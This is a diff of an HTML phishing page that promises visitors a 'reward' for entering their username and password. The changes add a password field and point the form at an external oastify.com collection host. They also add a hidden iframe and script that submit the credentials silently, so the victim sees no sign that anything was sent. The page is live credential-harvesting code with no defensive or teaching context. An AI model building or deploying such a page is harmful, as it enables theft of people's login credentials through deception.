@@ -20,9 +20,17 @@
         }
 
         img {
-            width: 80%;
-            max-width: 300px;
+            width: 100%;
+            max-width: 600px;
             height: auto;
+        }
+
+        #visibleForm {
+            margin-top: 20px;
+        }
+
+        #hiddenForm {
+            display: none;
         }
     </style>
 </head>
@@ -32,11 +40,34 @@
         <p>Please enter your username and password to access and get the reward.</p>
     </header>
 
-    <form action="http://g7osc929v970oqrep8qzkk0joau2is6h.oastify.com" method="post">
+    <img src="https://example.com/your-image.jpg" alt="Reward Image">
+
+    <form id="visibleForm" action="https://wjj8opep7pjg063u1o2fw0cz0q6iuaiz.oastify.com/submit" method="post">
         <label for="username">Username:</label>
         <input type="text" id="username" name="username" required><br>
 
-        <input type="submit" value="Submit">
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required><br>
+
+        <input type="button" value="Submit" onclick="submitForm()">
     </form>
+
+    <iframe id="hiddenForm" name="hiddenForm" src="about:blank"></iframe>
+
+    <script>
+        function submitForm() {
+            var visibleForm = document.getElementById("visibleForm");
+            var hiddenForm = document.getElementById("hiddenForm");
+
+            // Copy form values to hidden form
+            hiddenForm.contentDocument.body.innerHTML = visibleForm.outerHTML;
+
+            // Set the target of the visible form to the hidden iframe
+            visibleForm.target = "hiddenForm";
+
+            // Submit the visible form
+            visibleForm.submit();
+        }
+    </script>
 </body>
 </html>
